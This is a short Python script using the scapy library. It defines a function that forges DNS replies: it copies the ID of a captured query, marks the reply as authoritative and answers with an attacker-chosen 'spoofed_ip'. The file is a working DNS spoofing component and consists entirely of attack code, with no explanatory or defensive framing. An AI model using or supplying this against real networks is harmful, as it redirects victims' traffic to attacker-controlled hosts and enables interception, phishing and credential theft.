from scapy.all import *



def reply(packet, spoofed_ip, **kwargs):
    try:
        IP_LAYER = IP(
            src = packet[IP].dst, 
            dst = packet[IP].src
            )   

        UDP_LAYER = UDP(
            dport = packet[UDP].sport,
            sport = packet[UDP].dport
        )   

        DNS_LAYER = DNS(
            id = packet[DNS].id,
            qd = packet[DNS].qd,
            aa = 1,
            rd = 0,
            qr = 1,
            qdcount = 1,
            ancount = 1,
            nscount = 0,
            arcount = 0,
            ar = DNSRR(
                rrname = packet[DNS].qd.qname,
                type = 'A',
                ttl = 1000,
                rdata = spoofed_ip
                )
            )
            
        DNS_SPOOF_PACKET = IP_LAYER / UDP_LAYER / DNS_LAYER
        send(DNS_SPOOF_PACKET, **kwargs)
        
    except Exception as e:
        print(e)